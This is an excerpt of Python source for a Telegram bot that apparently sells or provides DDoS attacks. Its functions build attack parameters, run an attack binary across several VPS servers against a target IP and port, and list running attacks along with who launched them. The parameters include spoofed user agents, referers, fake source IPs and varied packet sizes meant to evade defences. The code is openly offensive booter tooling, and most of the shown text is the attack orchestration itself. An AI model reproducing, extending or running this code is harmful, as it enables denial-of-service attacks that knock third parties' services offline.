...
COOWNER_IDS = [7086729173, 5968988297]  # Other admin IDs
...
async def attack_input(update: Update, context: CallbackContext):
    ...
    # Generate advanced attack parameters
    attack_params = {
    ...
    def _execute_attack(vps, threads, attack_num):
        """Handles the actual attack execution on a VPS with advanced techniques"""
        ...
        try:
            ...
            cmd = (
                f"{BINARY_PATH} {ip} {port} {duration} {threads} --advanced "
                f"--user-agents '{json.dumps(attack_params['user_agents'])}' "
                f"--referers '{json.dumps(attack_params['referers'])}' "
                f"--fake-ips '{json.dumps(attack_params['fake_ips'])}' "
                f"--packet-sizes '{json.dumps(attack_params['packet_sizes'])}' "
                f"--delay {attack_params['delay_variation']}"
            )
...
async def show_running_attacks(update: Update, context: CallbackContext):
    ...
    targets = {}
    for attack_id, attack_info in running_attacks.items():
        target = attack_id.split('-')[0]  # Extract IP:PORT
        if target not in targets:
            targets[target] = {
                'start_time': attack_info['start_time'],
                'duration': attack_info['duration'],
                'is_special': attack_info['is_special'],
                'vps_ips': set(),
                'user_id': attack_info['user_id']
            }
        targets[target]['vps_ips'].add(attack_info['vps_ip'])
    ...
    for target, info in targets.items():
        ...
        # Get user info
        try:
            user = await context.bot.get_chat(info['user_id'])
            username = f"@{user.username}" if user.username else user.full_name
        except:
            username = f"User ID: {info['user_id']}"
        
        message += (
            f"🎯 *Target*: `{target}`\n"
            f"👤 *User*: {username}\n"
            f"⏱️ *Elapsed*: `{elapsed}s` | *Remaining*: `{remaining}s`\n"
            f"🧵 *Threads*: `{SPECIAL_MAX_THREADS if info['is_special'] else MAX_THREADS}`\n"
            f"🖥️ *VPS Servers*: {len(info['vps_ips'])} ({', '.join(info['vps_ips'])})\n\n"
        )
